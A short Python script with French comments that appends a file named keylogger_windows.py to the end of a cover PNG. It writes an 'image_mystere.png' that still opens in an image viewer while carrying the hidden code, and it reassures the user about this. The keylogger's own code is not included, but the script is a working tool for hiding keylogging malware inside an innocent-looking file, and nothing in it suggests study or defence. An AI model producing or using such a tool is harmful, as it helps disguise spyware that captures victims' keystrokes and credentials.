import os

def create_polyglot(image_path, script_path, output_path):
    """
    Crée une image polyglotte : 
    Combine une image et un script Python dans un seul fichier.
    Le fichier reste une image visualisable, mais contient le code à la fin.
    """
    try:
        # Lecture de l'image originale
        with open(image_path, 'rb') as f:
            img_data = f.read()
        
        # Lecture du script (le keylogger)
        with open(script_path, 'rb') as f:
            script_data = f.read()
        
        # Concaténation : Image + Script
        # On ajoute un commentaire Python pour que le script reste valide si exécuté
        with open(output_path, 'wb') as f:
            f.write(img_data)
            f.write(b"\n\n# --- DEBUT DU SCRIPT CACHE ---\n")
            f.write(script_data)
            
        print(f"✅ Succès ! L'image polyglotte a été créée : {output_path}")
        print(f"ℹ️  L'image pèse maintenant {(os.path.getsize(output_path)/1024):.2f} KB")
        print(f"💡 Astuce : Vous pouvez toujours ouvrir ce fichier avec une visionneuse d'images.")
        
    except Exception as e:
        print(f"❌ Erreur : {e}")

if __name__ == "__main__":
    # Chemins des fichiers
    current_dir = os.path.dirname(os.path.abspath(__file__))
    img_in = os.path.join(current_dir, "cover.png")
    script_in = os.path.join(current_dir, "keylogger_windows.py")
    img_out = os.path.join(current_dir, "image_mystere.png")
    
    if os.path.exists(img_in) and os.path.exists(script_in):
        create_polyglot(img_in, script_in, img_out)
    else:
        print("❌ Fichiers manquants : Assurez-vous d'avoir 'cover.png' et 'keylogger_windows.py' dans le dossier.")
